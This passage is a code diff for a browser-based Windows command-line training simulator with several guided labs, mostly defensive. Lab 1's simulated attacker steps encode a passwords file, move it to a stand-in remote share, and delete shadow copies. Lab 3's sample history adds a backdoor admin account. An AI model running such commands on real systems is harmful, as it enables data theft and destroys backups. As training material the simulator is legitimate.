@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cyber Range — Recon Basics (Windows Simulator)</title>
+<title>Cyber CMD Lab — Windows Simulator</title>
 <style>
   :root{
     --accent:#57b3ff;
@@ -41,25 +41,52 @@
   .d-icon svg{width:38px;height:38px;filter:drop-shadow(0 1px 2px rgba(0,0,0,0.5));}
   .d-icon span{color:#fff;font-size:12px;text-align:center;text-shadow:0 1px 3px rgba(0,0,0,0.85);line-height:1.2;}
 
-  /* ---------- START OVERLAY ---------- */
+  /* ---------- START OVERLAY (LABS LANDING) ---------- */
   #start-overlay{
     position:fixed;inset:0;z-index:999;display:flex;align-items:center;justify-content:center;
-    background:url('wallpaper.png') center center / cover no-repeat;
+    background:radial-gradient(1200px 720px at 50% 12%, #123a63, #061223 78%);
+    overflow:auto;
   }
-  #start-overlay::before{content:'';position:absolute;inset:0;background:rgba(10,14,20,0.55);backdrop-filter:blur(2px);}
-  #overlay-card{
-    position:relative;z-index:1;text-align:center;color:#fff;max-width:480px;padding:0 24px;
+  #start-overlay::before{content:'';position:absolute;inset:0;background:
+    repeating-linear-gradient(0deg, rgba(120,180,255,0.035) 0 1px, transparent 1px 3px);
+    pointer-events:none;}
+
+  #labs-landing{position:relative;z-index:1;width:100%;max-width:1120px;padding:40px 24px;text-align:center;color:#eaf2fb;}
+  .ll-head .win-logo{width:44px;height:44px;margin:0 auto 14px;display:block;}
+  .ll-head h1{
+    font-size:30px;letter-spacing:4px;margin:0 0 10px;font-weight:700;
+    background:linear-gradient(90deg,#57b3ff,#9fe4ff);-webkit-background-clip:text;background-clip:text;color:transparent;
   }
-  #overlay-card .win-logo{width:52px;height:52px;margin:0 auto 22px;display:block;}
-  #overlay-card h1{font-size:26px;margin:0 0 10px;font-weight:600;letter-spacing:.2px;}
-  #overlay-card p{font-size:14.5px;color:#d7dce3;line-height:1.6;margin:0 0 30px;}
-  #ready-btn{
-    padding:13px 34px;font-size:15px;font-weight:600;color:#0c1116;background:#fff;border:none;
-    border-radius:6px;cursor:pointer;letter-spacing:.2px;transition:transform .12s ease, background .12s ease;
+  .ll-head p{font-size:14px;color:#b6c6da;max-width:660px;margin:0 auto 30px;line-height:1.6;}
+  #cards-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;}
+  @media(max-width:960px){#cards-grid{grid-template-columns:repeat(2,1fr);}}
+  @media(max-width:560px){#cards-grid{grid-template-columns:1fr;}}
+  .ll-foot{margin-top:26px;font-size:11px;color:#7590b0;line-height:1.5;}
+
+  /* ---------- FLIP CARDS ---------- */
+  .flip-card{background:transparent;perspective:1300px;height:206px;cursor:pointer;}
+  .flip-inner{position:relative;width:100%;height:100%;transition:transform .55s cubic-bezier(.2,.7,.2,1);transform-style:preserve-3d;}
+  .flip-card:hover .flip-inner,.flip-card.flipped .flip-inner{transform:rotateY(180deg);}
+  .flip-front,.flip-back{
+    position:absolute;inset:0;backface-visibility:hidden;-webkit-backface-visibility:hidden;
+    border-radius:14px;padding:20px 16px;display:flex;flex-direction:column;align-items:center;justify-content:center;
+    background:rgba(16,30,52,0.5);backdrop-filter:blur(14px) saturate(1.35);-webkit-backdrop-filter:blur(14px) saturate(1.35);
+    border:1px solid rgba(120,180,255,0.22);box-shadow:0 14px 44px rgba(0,0,0,0.42);
   }
-  #ready-btn:hover{background:#e8e8e8;}
-  #ready-btn:active{transform:scale(0.97);}
-  #overlay-hint{margin-top:16px;font-size:11.5px;color:#9aa3ad;}
+  .flip-card:hover .flip-front,.flip-card:hover .flip-back{border-color:rgba(120,180,255,0.55);}
+  .flip-front{gap:9px;}
+  .fc-num{position:absolute;top:11px;right:13px;font-size:10.5px;color:#5f80a8;font-family:Consolas,monospace;letter-spacing:.5px;}
+  .fc-badge{font-size:10.5px;letter-spacing:2px;color:#08131f;background:linear-gradient(90deg,#57b3ff,#9fe4ff);padding:3px 11px;border-radius:20px;font-weight:700;}
+  .fc-title{font-size:18px;font-weight:700;color:#eef5fd;letter-spacing:.6px;}
+  .fc-topic{font-size:12.5px;color:#9fb6d0;line-height:1.4;padding:0 6px;}
+  .fc-hint{position:absolute;bottom:13px;font-size:10px;color:#6a86a8;letter-spacing:.6px;}
+  .flip-back{transform:rotateY(180deg);gap:11px;justify-content:space-between;padding:18px 16px 16px;}
+  .fc-back-id{font-size:10px;color:#6a86a8;font-family:Consolas,monospace;letter-spacing:.6px;}
+  .fc-back-title{font-size:14px;font-weight:700;color:#9fe4ff;}
+  .fc-info{font-size:11.6px;color:#c3d3e6;line-height:1.5;flex:1;overflow:auto;}
+  .fc-start{border:none;border-radius:8px;padding:10px 16px;background:linear-gradient(90deg,#2f7fd0,#57b3ff);color:#fff;font-size:12.5px;font-weight:700;cursor:pointer;letter-spacing:.4px;width:100%;}
+  .fc-start:hover{filter:brightness(1.09);}
+  .fc-start:active{transform:scale(0.98);}
 
   /* ---------- TASKBAR ---------- */
   #taskbar{
@@ -198,10 +225,12 @@
     box-shadow:0 20px 50px rgba(0,0,0,0.25);z-index:120;display:flex;flex-direction:column;overflow:hidden;
     border-left:1px solid rgba(255,255,255,0.4);border-bottom:1px solid rgba(255,255,255,0.4);
   }
-  #tp-head{padding:16px 18px 10px;border-bottom:1px solid rgba(0,0,0,0.08);flex:none;}
-  #tp-head h1{font-size:15px;margin:0 0 2px;font-weight:700;}
-  #tp-head p{font-size:11.5px;color:var(--panel-sub);margin:0;}
-  #tp-progress-wrap{height:5px;background:#eceef1;border-radius:4px;margin-top:12px;overflow:hidden;}
+  #tp-head{padding:14px 18px 10px;border-bottom:1px solid rgba(0,0,0,0.08);flex:none;}
+  #tp-topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
+  #tp-back{border:1px solid #cfd6df;background:#fff;border-radius:6px;padding:4px 11px;font-size:11.5px;cursor:pointer;color:#1b1f27;}
+  #tp-back:hover{background:#eef3f8;}
+  #tp-labname{font-size:11.5px;font-weight:700;color:#0f5ea8;letter-spacing:.5px;}
+  #tp-progress-wrap{height:5px;background:#eceef1;border-radius:4px;margin-top:2px;overflow:hidden;}
   #tp-progress-bar{height:100%;background:linear-gradient(90deg,#3a86c8,#57b3ff);width:0%;transition:width .3s ease;}
   #tp-step-count{font-size:11px;color:var(--panel-sub);margin-top:6px;}
   #tp-body{padding:16px 18px 18px;overflow-y:auto;flex:1;}
@@ -233,6 +262,40 @@
     font-size:13px;cursor:pointer;display:none;
   }
   #tp-disclaimer{font-size:10.5px;color:#9aa0aa;padding:10px 18px 14px;border-top:1px solid #ececec;flex:none;}
+
+  /* wallpaper on top; gradient behind as fallback if the image is missing */
+  #wallpaper{background:url('wallpaper.png') center center / cover no-repeat, linear-gradient(135deg,#0a1a30,#0d2b4e 45%,#0a2140);}
+
+  /* ---------- PDF BUTTON + MODAL ---------- */
+  #tp-pdf{
+    margin-top:12px;width:100%;padding:10px 0;border:none;border-radius:7px;
+    background:linear-gradient(90deg,#1f9d55,#2ec16b);color:#fff;font-size:13.5px;font-weight:700;
+    cursor:pointer;display:none;letter-spacing:.3px;
+  }
+  #tp-pdf:hover{filter:brightness(1.07);}
+  #tp-pdf:active{transform:scale(0.99);}
+
+  #pdf-modal{
+    position:fixed;inset:0;z-index:1600;display:none;align-items:center;justify-content:center;
+    background:rgba(6,14,26,0.62);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);
+  }
+  #pdf-modal.show{display:flex;}
+  .pm-card{
+    width:390px;max-width:92vw;background:#fff;border-radius:14px;padding:22px 22px 18px;
+    box-shadow:0 30px 80px rgba(0,0,0,0.5);
+  }
+  .pm-card h2{margin:0 0 4px;font-size:17px;color:#12324f;}
+  .pm-card .pm-sub{margin:0 0 6px;font-size:12px;color:#6b7684;line-height:1.4;}
+  .pm-card label{display:block;font-size:12px;color:#41505f;margin:13px 0 5px;font-weight:600;}
+  .pm-card input{width:100%;padding:9px 11px;border:1px solid #d3d9e0;border-radius:8px;font-size:13.5px;outline:none;}
+  .pm-card input:focus{border-color:#2b8ce6;}
+  .pm-actions{display:flex;gap:10px;margin-top:20px;}
+  .pm-actions button{flex:1;padding:10px 0;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;border:none;}
+  #pm-cancel{background:#eef1f4;color:#33404d;}
+  #pm-cancel:hover{background:#e2e7ec;}
+  #pm-ok{background:#2b8ce6;color:#fff;}
+  #pm-ok:hover{background:#1f79cd;}
+  #pm-status{font-size:11.5px;color:#6b7684;margin-top:12px;min-height:14px;text-align:center;}
 </style>
 </head>
 <body>
@@ -272,14 +335,16 @@
     </div>
   </div>
 
-  <!-- FULLSCREEN START OVERLAY -->
+  <!-- FULLSCREEN START OVERLAY / LABS LANDING -->
   <div id="start-overlay">
-    <div id="overlay-card">
-      <svg class="win-logo" viewBox="0 0 24 24"><rect x="2" y="2" width="9" height="9" fill="#57b3ff"/><rect x="13" y="2" width="9" height="9" fill="#57b3ff"/><rect x="2" y="13" width="9" height="9" fill="#57b3ff"/><rect x="13" y="13" width="9" height="9" fill="#57b3ff"/></svg>
-      <h1>Cyber Range · Recon &amp; Enumeration Basics</h1>
-      <p>A guided, simulated Windows 11 desktop. Follow the on-screen instructions to practice built-in reconnaissance commands. No real system or network is affected.</p>
-      <button id="ready-btn">Ready to Start</button>
-      <div id="overlay-hint">This will open in full screen. Press Esc anytime to exit full screen.</div>
+    <div id="labs-landing">
+      <div class="ll-head">
+        <svg class="win-logo" viewBox="0 0 24 24"><rect x="2" y="2" width="9" height="9" fill="#57b3ff"/><rect x="13" y="2" width="9" height="9" fill="#57b3ff"/><rect x="2" y="13" width="9" height="9" fill="#57b3ff"/><rect x="13" y="13" width="9" height="9" fill="#57b3ff"/></svg>
+        <h1>CYBER CMD LAB</h1>
+        <p>Pick a lab to begin. Each one is a guided, fully simulated Windows terminal that walks you through built-in commands step by step. No real system, network, or account is ever affected.</p>
+      </div>
+      <div id="cards-grid"></div>
+      <div class="ll-foot">Simulated training environment · Always get written authorization before running commands against systems you don't own.</div>
     </div>
   </div>
 
@@ -356,6 +421,10 @@
   <!-- TUTORIAL PANEL -->
   <div id="tutorial-panel">
     <div id="tp-head">
+      <div id="tp-topbar">
+        <button id="tp-back">&#9664; All Labs</button>
+        <span id="tp-labname">CYBER CMD LAB</span>
+      </div>
       <div id="tp-progress-wrap"><div id="tp-progress-bar"></div></div>
       <div id="tp-step-count">Step 1 of 9</div>
     </div>
@@ -364,14 +433,568 @@
       <div id="tp-feedback"></div>
       <button id="tp-continue">Continue</button>
       <div id="tp-done-badge">✓ Nice work — module complete.</div>
-      <button id="tp-restart">Restart lab</button>
+      <button id="tp-pdf">&#11015; Download Lab PDF</button>
+      <button id="tp-restart">Restart this lab</button>
     </div>
     <div id="tp-disclaimer">Simulated environment — no real system, network, or account is affected. Always get written authorization before running these commands against systems you don't own.</div>
   </div>
+
+  <!-- PDF DETAILS MODAL -->
+  <div id="pdf-modal">
+    <div class="pm-card">
+      <h2>Generate Lab Report</h2>
+      <p class="pm-sub">Enter the student details. The report includes every command screenshot from this lab.</p>
+      <label for="pm-name">Student Name</label>
+      <input id="pm-name" type="text" autocomplete="off" placeholder="e.g. Jane Doe">
+      <label for="pm-sid">SID</label>
+      <input id="pm-sid" type="text" autocomplete="off" placeholder="e.g. S-102394">
+      <label for="pm-grade">Grade</label>
+      <input id="pm-grade" type="text" autocomplete="off" placeholder="e.g. A">
+      <div class="pm-actions">
+        <button id="pm-cancel" type="button">Cancel</button>
+        <button id="pm-ok" type="button">OK &mdash; Download PDF</button>
+      </div>
+      <div id="pm-status"></div>
+    </div>
+  </div>
 </div>
+
+<!-- PDF + screenshot libraries (load when online) -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+
+<!-- ================= LAB DATA (editable JSON) ================= -->
+<script type="application/json" id="lab-data">{
+  "meta": {
+    "title": "Cyber CMD Lab",
+    "version": "2.0",
+    "note": "Fully simulated. Edit labs/commands/outputs here."
+  },
+  "introSteps": [
+    {
+      "type": "click",
+      "target": "#start-button",
+      "instruction": "Click the <b>Start button</b> (the Windows logo) on the taskbar."
+    },
+    {
+      "type": "type",
+      "target": "#start-search",
+      "expected": "cmd",
+      "instruction": "Type <b>cmd</b> into the search box that just opened."
+    },
+    {
+      "type": "click",
+      "target": "#search-result-cmd",
+      "instruction": "Click <b>Command Prompt</b> in the search results to open it."
+    }
+  ],
+  "labs": [
+    {
+      "id": "CMDLAB-01",
+      "number": 1,
+      "title": "CYBER CMD LAB-1",
+      "topic": "Recon & Enumeration Basics",
+      "info": "The starting point of any assessment. Map a computer and its network with built-in commands like ipconfig, arp, netstat and tasklist — then see how the same tools look in an attacker's hands.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "ipconfig /all",
+          "output": "Windows IP Configuration\n\n   Host Name . . . . . . . . . . . . : STUDENT-PC01\n   Primary Dns Suffix  . . . . . . . :\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n\nEthernet adapter Ethernet:\n\n   Description . . . . . . . . . . . : Intel(R) Ethernet Connection\n   Physical Address. . . . . . . . . : 00-1A-2B-3C-4D-5E\n   DHCP Enabled. . . . . . . . . . . : Yes\n   IPv4 Address. . . . . . . . . . . : 192.168.1.42(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 192.168.1.1",
+          "title": "Check your computer's address",
+          "whatItDoes": "This shows your computer's IP address and the network it's connected to."
+        },
+        {
+          "type": "command",
+          "command": "arp -a",
+          "output": "Interface: 192.168.1.42 --- 0xb\n  Internet Address      Physical Address      Type\n  192.168.1.1           aa-bb-cc-00-11-22     dynamic\n  192.168.1.10          aa-bb-cc-00-11-45     dynamic\n  192.168.1.23          aa-bb-cc-00-11-9f     dynamic",
+          "title": "See other devices nearby",
+          "whatItDoes": "This shows other computers that yours has recently talked to on the same network."
+        },
+        {
+          "type": "command",
+          "command": "netstat -ano",
+          "output": "Proto  Local Address        Foreign Address      State        PID\nTCP    192.168.1.42:49721   93.184.216.34:443    ESTABLISHED  4120\nTCP    192.168.1.42:139     0.0.0.0:0            LISTENING    4\nTCP    0.0.0.0:3389         0.0.0.0:0            LISTENING    892",
+          "title": "See open connections",
+          "whatItDoes": "This shows what your computer is currently connected to, and which program is using each connection."
+        },
+        {
+          "type": "command",
+          "command": "tasklist",
+          "output": "Image Name              PID   Session Name   Mem Usage\n========================= ===== ============== ============\nSystem Idle Process        0    Services         8 K\nsvchost.exe               892    Services      12,344 K\nexplorer.exe             4356    Console       55,120 K",
+          "title": "See running programs",
+          "whatItDoes": "This lists every program currently running on the computer, with its ID number."
+        },
+        {
+          "type": "command",
+          "command": "nslookup megacorp.local",
+          "output": "Server:  UnKnown\nAddress:  192.168.1.1\n\nName:    megacorp.local\nAddress: 192.168.1.10",
+          "title": "Find a website's address",
+          "whatItDoes": "This looks up the real address (IP) behind a name like megacorp.local."
+        },
+        {
+          "type": "command",
+          "command": "netsh wlan show profiles",
+          "output": "Profiles on interface Wi-Fi:\n\nGroup policy profiles (read only)\n----------------------------------\n    (none)\n\nUser profiles\n--------------\n    All User Profile     : HomeNetwork\n    All User Profile     : CoffeeShop-Guest",
+          "title": "See saved Wi-Fi networks",
+          "whatItDoes": "This lists every Wi-Fi network this computer has connected to before."
+        },
+        {
+          "type": "command",
+          "command": "whoami /priv",
+          "output": "PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                       State\n============================= ================================= ========\nSeShutdownPrivilege           Shut down the system              Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking           Enabled\nSeUndockPrivilege             Remove computer from docking st.  Disabled",
+          "title": "Check your own permissions",
+          "whatItDoes": "This shows what special powers your current user account has on this computer."
+        },
+        {
+          "type": "info",
+          "instruction": "Nice work! Now let's switch roles. Act like an attacker and go after the <b>My Files</b> folder, using the same terminal."
+        },
+        {
+          "type": "command",
+          "command": "dir \"Desktop\\My Files\"",
+          "output": " Volume in drive C has no label.\n Directory of C:\\Users\\Student\\Desktop\\My Files\n\n09/03/2026  09:12 AM             2,048 Passwords_Backup.txt\n02/02/2026  04:47 PM            49,152 Resume_JohnDoe.docx\n11/30/2025  08:03 AM             6,144 Old_Notes.txt\n               3 File(s)         57,344 bytes",
+          "title": "Look inside the folder",
+          "whatItDoes": "This shows every file inside the <b>My Files</b> folder.",
+          "effect": "compromise-myfiles"
+        },
+        {
+          "type": "command",
+          "command": "cd \"Desktop\\My Files\"",
+          "output": "",
+          "title": "Step into the folder",
+          "whatItDoes": "This moves you inside the <b>My Files</b> folder, so the next commands work on it directly.",
+          "effect": "open-myfiles"
+        },
+        {
+          "type": "command",
+          "command": "dir /a",
+          "output": " Directory of C:\\Users\\Student\\Desktop\\My Files\n\n09/03/2026  09:12 AM             2,048 Passwords_Backup.txt\n02/02/2026  04:47 PM            49,152 Resume_JohnDoe.docx\n11/30/2025  08:03 AM             6,144 Old_Notes.txt\n09/01/2026  07:40 AM               512 ~cache.tmp          [Hidden]\n               4 File(s)         57,856 bytes",
+          "title": "Look for hidden files",
+          "whatItDoes": "This also shows files that are normally hidden from view."
+        },
+        {
+          "type": "command",
+          "command": "attrib -h -r -s Passwords_Backup.txt",
+          "output": "",
+          "title": "Unlock the file",
+          "whatItDoes": "This removes the file's hidden, read-only, and protected settings so it can be changed."
+        },
+        {
+          "type": "command",
+          "command": "ren Passwords_Backup.txt Passwords_Backup.dat",
+          "output": "",
+          "title": "Rename the file",
+          "whatItDoes": "This changes the file's name and extension, so it looks different."
+        },
+        {
+          "type": "command",
+          "command": "certutil -encode Passwords_Backup.dat Passwords_Backup.enc",
+          "output": "Input Length = 2048\nOutput Length = 2840\nCertUtil: -encode command completed successfully.",
+          "title": "Scramble the file",
+          "whatItDoes": "This turns the file into a jumbled version that's harder to read. It can still be un-scrambled easily — it is not the same as strong, real encryption."
+        },
+        {
+          "type": "command",
+          "command": "del Passwords_Backup.dat",
+          "output": "",
+          "title": "Delete the old copy",
+          "whatItDoes": "This removes the readable copy, so only the scrambled version is left."
+        },
+        {
+          "type": "command",
+          "command": "net use Z: \\\\offense-cloud\\dropzone",
+          "output": "The command completed successfully.",
+          "title": "Connect to an outside drive",
+          "whatItDoes": "This connects your computer to a remote storage location, shown here as drive <b>Z</b>."
+        },
+        {
+          "type": "command",
+          "command": "move Passwords_Backup.enc Z:\\",
+          "output": "        1 file(s) moved.",
+          "title": "Send the file out",
+          "whatItDoes": "This moves the scrambled file from this computer onto the outside drive."
+        },
+        {
+          "type": "command",
+          "command": "vssadmin delete shadows /all /quiet",
+          "output": "vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool\n(C) Microsoft Corporation. All rights reserved.\n\nSuccessfully deleted 3 shadow copies.",
+          "title": "Delete the backup copies",
+          "whatItDoes": "This removes Windows' built-in backup snapshots, so the file can't easily be restored."
+        }
+      ],
+      "outro": "<b>Great work — lab complete!</b><br><br>First, you looked around a computer and its network (recon).<br><br>Then, you acted like an attacker: you found a folder, changed and scrambled a file, sent it to an outside drive, and deleted the backup copies.<br><br>Only ever try commands like these on a computer or network you own, or have clear permission to test."
+    },
+    {
+      "id": "CMDLAB-02",
+      "number": 2,
+      "title": "CYBER CMD LAB-2",
+      "topic": "Check for Malware",
+      "info": "Learn the defender's malware sweep: list running programs and services, check scheduled tasks and auto-starts, fingerprint a file, and verify Windows' own files are untouched.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "tasklist /svc",
+          "output": "Image Name              PID    Services\n======================= ====== =============================\nSystem                     4    N/A\nsvchost.exe              892    Dhcp, Dnscache\nexplorer.exe            4356    N/A\nupdater_x86.exe         5120    N/A",
+          "title": "See programs and their services",
+          "whatItDoes": "This lists running programs along with the background services each one runs. An unfamiliar name is worth a closer look."
+        },
+        {
+          "type": "command",
+          "command": "schtasks /query /fo LIST",
+          "output": "Folder: \\\nHostName:      STUDENT-PC01\nTaskName:      \\Microsoft\\Windows\\UpdateOrchestrator\nNext Run Time: 9/26/2026 3:00:00 AM\nStatus:        Ready\n\nTaskName:      \\SystemCheck\nNext Run Time: 9/26/2026 3:15:00 AM\nStatus:        Ready",
+          "title": "See scheduled tasks",
+          "whatItDoes": "This shows jobs set to run automatically. Malware often hides here so it starts again after a reboot."
+        },
+        {
+          "type": "command",
+          "command": "wmic startup get caption,command",
+          "output": "Caption            Command\nOneDrive           C:\\Users\\Student\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\nSecurity Health    C:\\Windows\\System32\\SecurityHealthSystray.exe\nsyshelper          C:\\Users\\Student\\AppData\\Roaming\\syshelper.exe",
+          "title": "See what starts automatically",
+          "whatItDoes": "This lists programs that launch when the computer turns on. An unknown entry in a user folder is a red flag."
+        },
+        {
+          "type": "command",
+          "command": "certutil -hashfile Wireshark-4.2.5-x64.exe SHA256",
+          "output": "SHA256 hash of Wireshark-4.2.5-x64.exe:\na3f5c9d2b17e46f08c9a2b4d6e8f1027c3b5a7d9e1f2038475869abcdef01234\nCertUtil: -hashfile command completed successfully.",
+          "title": "Get a file's fingerprint",
+          "whatItDoes": "This creates a unique fingerprint (hash) for a file. You can compare it against known-good or known-bad lists to check whether a file is safe."
+        },
+        {
+          "type": "command",
+          "command": "sfc /verifyonly",
+          "output": "Beginning system scan.  This process will take some time.\n\nBeginning verification phase of system scan.\nVerification 100% complete.\n\nWindows Resource Protection did not find any integrity violations.",
+          "title": "Check for tampered system files",
+          "whatItDoes": "This checks Windows' own files to see whether any have been changed or damaged, which can be a sign of infection."
+        },
+        {
+          "type": "command",
+          "command": "net start",
+          "output": "These Windows services are started:\n\n   Application Information\n   Base Filtering Engine\n   DHCP Client\n   Windows Defender Firewall\n\nThe command completed successfully.",
+          "title": "See running background services",
+          "whatItDoes": "This lists the background services running now. Confirming key security services (like the firewall) are on is part of a health check."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You practiced the checks defenders use to spot malware: reviewing running programs and services, scheduled tasks, auto-start entries, file fingerprints, and system-file integrity.<br><br>These commands only read information — they don't change anything — so they're safe to run on your own machine any time."
+    },
+    {
+      "id": "CMDLAB-03",
+      "number": 3,
+      "title": "CYBER CMD LAB-3",
+      "topic": "Social Engineering Signs",
+      "info": "Social engineering targets people, not machines. Practice spotting the traces it leaves behind — surprise accounts, unfamiliar logins, and sneaky group changes.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "net user",
+          "output": "User accounts for \\\\STUDENT-PC01\n\n-------------------------------------------------------------------------------\nAdministrator            DefaultAccount           Guest\nStudent                  helpdesk_temp\nThe command completed successfully.",
+          "title": "See all accounts on the computer",
+          "whatItDoes": "This lists every account. After a social-engineering attack, an extra account like \"helpdesk_temp\" may have been added by someone pretending to be support."
+        },
+        {
+          "type": "command",
+          "command": "query user",
+          "output": " USERNAME       SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME\n>student        console        1  Active  none       9/26/2026 8:02 AM\n helpdesk_temp  rdp-tcp#2      2  Active  .          9/26/2026 8:47 AM",
+          "title": "See who is logged in now",
+          "whatItDoes": "This shows who is currently signed in. A remote session you don't recognize can mean someone talked their way in."
+        },
+        {
+          "type": "command",
+          "command": "doskey /history",
+          "output": "whoami\nnet user helpdesk_temp Passw0rd! /add\nnet localgroup administrators helpdesk_temp /add\ncls",
+          "title": "See recently typed commands",
+          "whatItDoes": "This shows commands typed earlier in this window. It can reveal what a person who \"borrowed\" the computer actually did."
+        },
+        {
+          "type": "command",
+          "command": "wmic useraccount get name,disabled",
+          "output": "Name              Disabled\nAdministrator     TRUE\nDefaultAccount    TRUE\nGuest             TRUE\nStudent           FALSE\nhelpdesk_temp     FALSE",
+          "title": "See which accounts are active",
+          "whatItDoes": "This shows each account and whether it is turned off. A new, active account that nobody set up on purpose is suspicious."
+        },
+        {
+          "type": "command",
+          "command": "whoami /groups",
+          "output": "GROUP INFORMATION\n-----------------\nGroup Name                             Type\n====================================== ================\nEveryone                               Well-known group\nBUILTIN\\Users                          Alias\nBUILTIN\\Administrators                 Alias",
+          "title": "See what groups your account is in",
+          "whatItDoes": "This shows the groups your account belongs to, which decide what you can do. Attackers try to trick users into adding accounts to powerful groups."
+        },
+        {
+          "type": "command",
+          "command": "net localgroup guests",
+          "output": "Alias name     guests\nComment        Guests have the same access as members of the Users group\n\nMembers\n-------------------------------------------------------------------------------\nGuest\nThe command completed successfully.",
+          "title": "Check the Guests group",
+          "whatItDoes": "This shows who is in the low-privilege Guests group. Reviewing group membership helps you spot accounts that were quietly added."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You saw the traces a social-engineering attack can leave behind: surprise accounts, unfamiliar logins, and risky group changes.<br><br>The best defense is people: always verify who you're really talking to before granting access or running commands for someone."
+    },
+    {
+      "id": "CMDLAB-04",
+      "number": 4,
+      "title": "CYBER CMD LAB-4",
+      "topic": "Authorization & Access",
+      "info": "Authorization is about what an account is allowed to do. Inspect group membership, folder permissions, admin lists and applied policies.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "whoami /all",
+          "output": "USER INFORMATION\n----------------\nUser Name             SID\n===================== ==============================================\nstudent-pc01\\student  S-1-5-21-1004336348-1177238915-682003330-1001\n\nGROUP INFORMATION\n-----------------\nBUILTIN\\Users                    Mandatory group, Enabled\nBUILTIN\\Administrators           Group used for deny only",
+          "title": "See everything about your access",
+          "whatItDoes": "This shows your account name, ID, groups, and permissions all together — a full picture of what you are allowed to do."
+        },
+        {
+          "type": "command",
+          "command": "icacls \"Desktop\"",
+          "output": "Desktop NT AUTHORITY\\SYSTEM:(F)\n        BUILTIN\\Administrators:(F)\n        STUDENT-PC01\\Student:(M)\n\nSuccessfully processed 1 files; Failed processing 0 files",
+          "title": "See who can use a folder",
+          "whatItDoes": "This shows the access list for a folder: (F) means full control, (M) means modify. It tells you exactly who is allowed to do what."
+        },
+        {
+          "type": "command",
+          "command": "net localgroup",
+          "output": "Aliases for \\\\STUDENT-PC01\n\n-------------------------------------------------------------------------------\n*Administrators\n*Guests\n*Remote Desktop Users\n*Users\nThe command completed successfully.",
+          "title": "See all permission groups",
+          "whatItDoes": "This lists every permission group on the computer. Each group grants a different level of access."
+        },
+        {
+          "type": "command",
+          "command": "net localgroup administrators",
+          "output": "Alias name     administrators\nComment        Administrators have complete and unrestricted access\n\nMembers\n-------------------------------------------------------------------------------\nAdministrator\nStudent\nThe command completed successfully.",
+          "title": "See who has admin rights",
+          "whatItDoes": "This shows who has full control of the computer. Keeping this list short is a key security practice (least privilege)."
+        },
+        {
+          "type": "command",
+          "command": "gpresult /r",
+          "output": "RSOP data for STUDENT-PC01\\Student on STUDENT-PC01 : Logging Mode\n------------------------------------------------------------------\n\nUSER SETTINGS\n    CN=Student,CN=Users,DC=megacorp,DC=local\n    Applied Group Policy Objects\n        Password Policy\n        Desktop Lockdown",
+          "title": "See the rules applied to you",
+          "whatItDoes": "This shows the policies your organization applies to your account, such as password rules or restrictions."
+        },
+        {
+          "type": "command",
+          "command": "runas /user:Administrator whoami",
+          "output": "Enter the password for Administrator:\nAttempting to start whoami as user \"STUDENT-PC01\\Administrator\" ...\nRUNAS ERROR: Unable to run - whoami\n1326: The user name or password is incorrect.",
+          "title": "Try running as another user",
+          "whatItDoes": "This tries to run a command as a different, more powerful account. Without the right password it fails — which is authorization working as intended."
+        }
+      ],
+      "outro": "<b>Lab complete!</b><br><br>You explored authorization — what an account is allowed to do. You checked group membership, folder permissions, admin lists, and applied policies.<br><br>Key idea: give each account the least access it needs to do its job (least privilege)."
+    },
+    {
+      "id": "CMDLAB-05",
+      "number": 5,
+      "title": "CYBER CMD LAB-5",
+      "topic": "Authentication & Logins",
+      "info": "Authentication is about proving who you are. Explore account IDs, password rules, saved credentials and login tickets.",
+      "steps": [
+        {
+          "type": "command",
+          "command": "whoami /user",
+          "output": "USER INFORMATION\n----------------\nUser Name             SID\n===================== ==============================================\nstudent-pc01\\student  S-1-5-21-1004336348-1177238915-682003330-1001",
+          "title": "See your account's unique ID",
+          "whatItDoes": "This shows your account's name and its unique ID (SID). The computer uses this ID to know exactly who you are."
+        },
+        {
+          "type": "command",
+          "command": "net user Student",
+          "output": "User name                    Student\nFull Name                    Student User\nAccount active               Yes\nPassword last set            9/1/2026 8:15:00 AM\nPassword expires             11/30/2026 8:15:00 AM\nLast logon                   9/26/2026 8:02:11 AM\nThe command completed successfully.",
+          "title": "See your account details",
+          "whatItDoes": "This shows details about an account, including when the password was last set and the last time it signed in."
+        },
+        {
+          "type": "command",
+          "command": "net accounts",
+          "output": "Force user logoff how long after time expires?:       Never\nMinimum password age (days):                          0\nMaximum password age (days):                          90\nMinimum password length:                              8\nLength of password history maintained:                5\nLockout threshold:                                    5\nThe command completed successfully.",
+          "title": "See the password rules",
+          "whatItDoes": "This shows the sign-in rules: how long passwords last, how long they must be, and how many wrong tries lock the account."
+        },
+        {
+          "type": "command",
+          "command": "cmdkey /list",
+          "output": "Currently stored credentials:\n\n    Target: Domain:target=megacorp.local\n    Type: Domain Password\n    User: MEGACORP\\student\n\n    Target: LegacyGeneric:target=fileserver\n    Type: Generic\n    User: backup_svc",
+          "title": "See saved sign-in details",
+          "whatItDoes": "This lists logins the computer has saved so you don't retype them. Saved credentials are convenient but can be misused if a device is stolen."
+        },
+        {
+          "type": "command",
+          "command": "klist",
